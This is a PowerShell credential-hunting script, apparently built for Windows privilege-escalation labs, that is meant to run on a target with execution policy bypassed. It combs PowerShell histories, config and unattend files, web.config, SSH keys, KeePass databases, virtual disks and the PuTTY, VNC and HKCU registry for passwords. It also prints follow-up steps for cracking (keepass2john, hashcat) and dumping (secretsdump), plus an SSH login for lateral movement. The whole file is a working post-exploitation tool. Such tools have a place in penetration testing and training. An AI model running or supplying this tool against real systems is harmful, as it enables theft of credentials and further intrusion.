# ============================================================
# WWPE-CREDS - Windows Credential Hunter
# Based on HTB Academy Windows Privilege Escalation Module
# Run SEPARATELY from wwpe_enum.ps1 to avoid stalling
# Run on target as: powershell -ep bypass -File wwpe_creds.ps1
# ============================================================

$OutputFile = "wwpe_creds_$($env:COMPUTERNAME)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

function Write-Red    { param($msg) Write-Host "[!!!] $msg" -ForegroundColor Red;    "[!!!] $msg" | Out-File $OutputFile -Append }
function Write-Yellow { param($msg) Write-Host "[??] $msg"  -ForegroundColor Yellow; "[??] $msg"  | Out-File $OutputFile -Append }
function Write-Green  { param($msg) Write-Host "[+] $msg"   -ForegroundColor Green;  "[+] $msg"   | Out-File $OutputFile -Append }
function Write-Info   { param($msg) Write-Host "$msg";                                "$msg"       | Out-File $OutputFile -Append }
function Write-Next   { param($msg) Write-Host "  [NEXT STEPS] $msg" -ForegroundColor Yellow; "  [NEXT STEPS] $msg" | Out-File $OutputFile -Append }

function Write-Section {
    param($title)
    $line = "=" * 60
    Write-Host "`n$line" -ForegroundColor Cyan
    Write-Host "  SECTION: $title" -ForegroundColor Cyan
    Write-Host "$line" -ForegroundColor Cyan
    "`n$line`n  SECTION: $title`n$line" | Out-File $OutputFile -Append
}

# Paths to exclude from searches
$ExcludePatterns = @(
    "*\Windows\WinSxS\*",
    "*\Windows\assembly\*",
    "*\Windows\Microsoft.NET\*",
    "*\Windows\SoftwareDistribution\*",
    "*\Windows\servicing\*",
    "*\Windows\Logs\*",
    "*\AppData\Local\Temp\*"
)

function Should-Exclude {
    param($path)
    foreach ($pattern in $ExcludePatterns) {
        if ($path -like $pattern) { return $true }
    }
    return $false
}

Write-Host ""
Write-Host "  WWPE-CREDS - Windows Credential Hunter" -ForegroundColor Cyan
Write-Host "  Based on HTB Academy Windows PrivEsc Module" -ForegroundColor Cyan
Write-Host ""
Write-Green "Output saving to: $OutputFile"
Write-Green "Started: $(Get-Date)"
Write-Yellow "This script runs deep file searches - may take several minutes"

# ============================================================
Write-Section "1 - POWERSHELL HISTORY (ALL USERS)"
# ============================================================
Write-Green "Searching PowerShell history for all user profiles:"
Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $histPath = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $histPath) {
        Write-Yellow "History file: $histPath"
        $content = Get-Content $histPath -ErrorAction SilentlyContinue
        $credLines = $content | Select-String -Pattern "password|passwd|/p:|/pass|credential|secret|token|-Password|-Credential" -CaseSensitive:$false
        if ($credLines) {
            foreach ($line in $credLines) {
                Write-Red "  Credential in history: $($line.Line.Trim())"
            }
        }
        # Print last 20 entries regardless
        Write-Yellow "  Last 20 entries:"
        $content | Select-Object -Last 20 | ForEach-Object { Write-Info "    $_" }
    }
}

# ============================================================
Write-Section "2 - CONFIG FILE CREDENTIAL SEARCH"
# ============================================================
Write-Green "Searching config/ini/xml files for passwords (30 second timeout per drive):"

$searchTerms = @("password","passwd","pwd","secret","credential","connectionstring","DefaultPassword")
$extensions  = @("*.xml","*.ini","*.cfg","*.config","*.txt","*.conf","*.ps1","*.bat","*.cmd")

$searchRoots = @("C:\inetpub", "C:\xampp", "C:\wamp", "C:\Users", "C:\ProgramData",
                 "C:\Program Files", "C:\Program Files (x86)", "C:\Scripts", "C:\Backup")

foreach ($root in $searchRoots) {
    if (-not (Test-Path $root)) { continue }
    Write-Green "Searching in $root..."

    $job = Start-Job -ScriptBlock {
        param($root, $extensions, $searchTerms, $ExcludePatterns)
        Get-ChildItem $root -Recurse -Include $extensions -ErrorAction SilentlyContinue |
            Where-Object {
                $file = $_.FullName
                $exclude = $false
                foreach ($p in $ExcludePatterns) { if ($file -like $p) { $exclude = $true; break } }
                -not $exclude
            } |
            ForEach-Object {
                $file = $_
                Select-String -Path $file.FullName -Pattern ($searchTerms -join "|") -CaseSensitive:$false -ErrorAction SilentlyContinue |
                    Select-Object Path, LineNumber, Line
            }
    } -ArgumentList $root, $extensions, $searchTerms, $ExcludePatterns

    $completed = Wait-Job $job -Timeout 30
    if ($completed) {
        $results = Receive-Job $job
        foreach ($result in $results) {
            Write-Red "Credential hit: $($result.Path):$($result.LineNumber)"
            Write-Red "  $($result.Line.Trim())"
        }
    } else {
        Stop-Job $job
        Write-Yellow "Search in $root timed out after 30 seconds - partial results may exist"
    }
    Remove-Job $job -Force -ErrorAction SilentlyContinue
}

# ============================================================
Write-Section "3 - UNATTEND.XML SEARCH"
# ============================================================
Write-Green "Searching for unattend.xml files (may contain auto-logon credentials):"
$unattendPaths = @(
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\system32\sysprep\unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\unattend.xml",
    "C:\unattend.txt"
)

foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Write-Red "Unattend file found: $path"
        $content = Get-Content $path -ErrorAction SilentlyContinue
        $passLines = $content | Select-String -Pattern "Password|AutoLogon|DefaultUserName|DefaultPassword"
        foreach ($line in $passLines) {
            Write-Red "  $($line.Line.Trim())"
        }
        Write-Next "Check for base64 encoded passwords - decode with: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<value>'))"
    }
}

# ============================================================
Write-Section "4 - WEB CONFIG FILES"
# ============================================================
Write-Green "Searching for web.config files with credentials:"
$webConfigPaths = @("C:\inetpub", "C:\xampp", "C:\wamp", "C:\wwwroot")

foreach ($root in $webConfigPaths) {
    if (-not (Test-Path $root)) { continue }
    Get-ChildItem $root -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Yellow "web.config found: $($_.FullName)"
        $content = Get-Content $_.FullName -ErrorAction SilentlyContinue
        $credLines = $content | Select-String -Pattern "password|connectionString|username" -CaseSensitive:$false
        foreach ($line in $credLines) {
            Write-Red "  $($line.Line.Trim())"
        }
    }
}

# Also check default IIS path
if (Test-Path "C:\inetpub\wwwroot\web.config") {
    Write-Yellow "Default IIS web.config: C:\inetpub\wwwroot\web.config"
    Get-Content "C:\inetpub\wwwroot\web.config" -ErrorAction SilentlyContinue |
        Select-String -Pattern "password|connectionString" -CaseSensitive:$false |
        ForEach-Object { Write-Red "  $($_.Line.Trim())" }
}

# ============================================================
Write-Section "5 - CHROME DICTIONARY FILE"
# ============================================================
Write-Green "Checking Chrome custom dictionary for accidentally saved passwords:"
Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $dictPath = "$($_.FullName)\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt"
    if (Test-Path $dictPath) {
        Write-Yellow "Chrome dictionary: $dictPath"
        $content = Get-Content $dictPath -ErrorAction SilentlyContinue
        $credLines = $content | Select-String -Pattern "pass|pwd|secret|token|key" -CaseSensitive:$false
        if ($credLines) {
            foreach ($line in $credLines) {
                Write-Red "  Possible credential in Chrome dictionary: $($line.Line.Trim())"
            }
        }
    }
}

# ============================================================
Write-Section "6 - SSH KEYS AND PRIVATE KEY FILES"
# ============================================================
Write-Green "Searching for SSH private keys:"
$sshKeyNames = @("id_rsa","id_ed25519","id_ecdsa","id_dsa","*.pem","*.ppk","*.key")
$sshSearchPaths = @("C:\Users", "C:\ProgramData", "C:\inetpub")

foreach ($root in $sshSearchPaths) {
    if (-not (Test-Path $root)) { continue }
    foreach ($keyName in $sshKeyNames) {
        Get-ChildItem $root -Recurse -Filter $keyName -ErrorAction SilentlyContinue |
            Where-Object { -not (Should-Exclude $_.FullName) } |
            ForEach-Object {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                if ($content -match "PRIVATE KEY") {
                    Write-Red "SSH private key found: $($_.FullName)"
                    Write-Next "Check known_hosts in same directory for lateral movement targets"
                    Write-Next "ssh -i $($_.FullName) <user>@<host>"
                } else {
                    Write-Yellow "Possible key file (no PRIVATE KEY header): $($_.FullName)"
                }
            }
    }
}

# ============================================================
Write-Section "7 - KEEPASS AND PASSWORD MANAGER FILES"
# ============================================================
Write-Green "Searching for KeePass and password manager database files:"
$pmExtensions = @("*.kdbx","*.kdb","*.1pif","*.agilekeychain","*.dashlane")

Get-ChildItem "C:\Users","C:\ProgramData" -Recurse -Include $pmExtensions -ErrorAction SilentlyContinue |
    Where-Object { -not (Should-Exclude $_.FullName) } |
    ForEach-Object {
        Write-Red "Password manager database: $($_.FullName)"
        Write-Next "Copy to attack box then: python2.7 keepass2john.py $($_.Name)"
        Write-Next "Then: hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt"
    }

# ============================================================
Write-Section "8 - VIRTUAL DISK FILES (VMDK/VHD/VHDX)"
# ============================================================
Write-Green "Searching for virtual disk files that may contain SAM/NTDS:"
$vdiskExts = @("*.vmdk","*.vhd","*.vhdx")
$vdiskPaths = @("C:\","D:\","E:\")

foreach ($root in $vdiskPaths) {
    if (-not (Test-Path $root)) { continue }
    Write-Green "Searching $root for virtual disks (may be slow)..."
    $job = Start-Job -ScriptBlock {
        param($root, $vdiskExts)
        Get-ChildItem $root -Recurse -Include $vdiskExts -ErrorAction SilentlyContinue |
            Select-Object FullName, Length
    } -ArgumentList $root, $vdiskExts

    $completed = Wait-Job $job -Timeout 20
    if ($completed) {
        $results = Receive-Job $job
        foreach ($result in $results) {
            $sizeMB = [math]::Round($result.Length / 1MB, 2)
            Write-Red "Virtual disk found: $($result.FullName) ($sizeMB MB)"
            Write-Next "Mount and extract: guestmount -a $($result.Name) -i --ro /mnt/disk (on Linux)"
            Write-Next "Or mount in Windows: Mount-VHD -Path '$($result.FullName)' -ReadOnly"
            Write-Next "Then: secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL"
        }
    } else {
        Stop-Job $job
        Write-Yellow "Virtual disk search in $root timed out"
    }
    Remove-Job $job -Force -ErrorAction SilentlyContinue
}

# ============================================================
Write-Section "9 - INTERESTING FILE NAMES"
# ============================================================
Write-Green "Searching for files with interesting names (passwords, credentials, keys):"
$interestingNames = @(
    "*password*","*passwd*","*creds*","*credential*","*secret*",
    "*logins*","*pass.txt","*pass.xml","*pass.ini",
    "*.rdp","*.vnc","*ssh_config*","*authorized_keys*"
)

$job = Start-Job -ScriptBlock {
    param($interestingNames, $ExcludePatterns)
    Get-ChildItem "C:\Users","C:\ProgramData","C:\inetpub","C:\Scripts","C:\Backup" `
        -Recurse -Include $interestingNames -ErrorAction SilentlyContinue |
        Where-Object {
            $file = $_.FullName
            $exclude = $false
            foreach ($p in $ExcludePatterns) { if ($file -like $p) { $exclude = $true; break } }
            -not $exclude
        } |
        Select-Object FullName, LastWriteTime, Length
} -ArgumentList $interestingNames, $ExcludePatterns

$completed = Wait-Job $job -Timeout 30
if ($completed) {
    $results = Receive-Job $job
    foreach ($result in $results) {
        Write-Red "Interesting file: $($result.FullName) (Modified: $($result.LastWriteTime))"
        # Show first 10 lines of txt files
        if ($result.FullName -match "\.txt$|\.xml$|\.ini$|\.cfg$") {
            $preview = Get-Content $result.FullName -TotalCount 10 -ErrorAction SilentlyContinue
            $preview | ForEach-Object { Write-Yellow "  $_" }
        }
    }
} else {
    Stop-Job $job
    Write-Yellow "Interesting file search timed out after 30 seconds"
}
Remove-Job $job -Force -ErrorAction SilentlyContinue

# ============================================================
Write-Section "10 - REGISTRY CREDENTIAL SEARCH"
# ============================================================
Write-Green "Searching common registry paths for stored credentials:"

$regSearchPaths = @(
    "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions",
    "HKCU:\SOFTWARE\ORL\WinVNC3\Password",
    "HKCU:\SOFTWARE\TightVNC\Server",
    "HKLM:\SOFTWARE\RealVNC\WinVNC4",
    "HKCU:\SOFTWARE\OpenSSH\Agent\Keys"
)

foreach ($regPath in $regSearchPaths) {
    try {
        if (Test-Path $regPath) {
            Write-Yellow "Registry path found: $regPath"
            $items = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
            $items.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                if ($_.Value -ne $null -and $_.Value -ne "") {
                    Write-Red "  $($_.Name) = $($_.Value)"
                }
            }
        }
    } catch {}
}

# Search for password in HKCU
Write-Green "`nSearching HKCU registry for password values (may take time):"
$job = Start-Job -ScriptBlock {
    Get-ChildItem "HKCU:\" -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object {
            try {
                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                $props.PSObject.Properties | Where-Object {
                    $_.Name -match "password|passwd|pwd" -and $_.Value -ne $null -and $_.Value -ne ""
                } | Select-Object @{N="Path";E={$_.PSPath}}, Name, Value
            } catch {}
        }
}

$completed = Wait-Job $job -Timeout 30
if ($completed) {
    $results = Receive-Job $job
    foreach ($r in $results) {
        Write-Red "Registry credential: $($r.Path)"
        Write-Red "  $($r.Name) = $($r.Value)"
    }
} else {
    Stop-Job $job
    Write-Yellow "Registry search timed out after 30 seconds"
}
Remove-Job $job -Force -ErrorAction SilentlyContinue

# ============================================================
Write-Section "FINAL SUMMARY"
# ============================================================
Write-Host ""
Write-Host "=== HIGH CONFIDENCE CREDENTIAL FINDINGS ===" -ForegroundColor Red
Get-Content $OutputFile | Select-String "\[!!!\]" | ForEach-Object { Write-Host $_.Line -ForegroundColor Red }

Write-Host ""
Write-Host "=== POSSIBLE FINDINGS ===" -ForegroundColor Yellow
Get-Content $OutputFile | Select-String "\[\?\?\]" | ForEach-Object { Write-Host $_.Line -ForegroundColor Yellow }

Write-Host ""
Write-Green "Scan complete: $(Get-Date)"
Write-Green "Output saved to: $OutputFile"
Write-Host ""
Write-Host "GREP TIPS:" -ForegroundColor Cyan
Write-Host "  Select-String '\[!!!\]' $OutputFile    # All high confidence findings" -ForegroundColor Cyan
Write-Host "  Select-String 'NEXT STEPS' $OutputFile # Next step reminders" -ForegroundColor Cyan
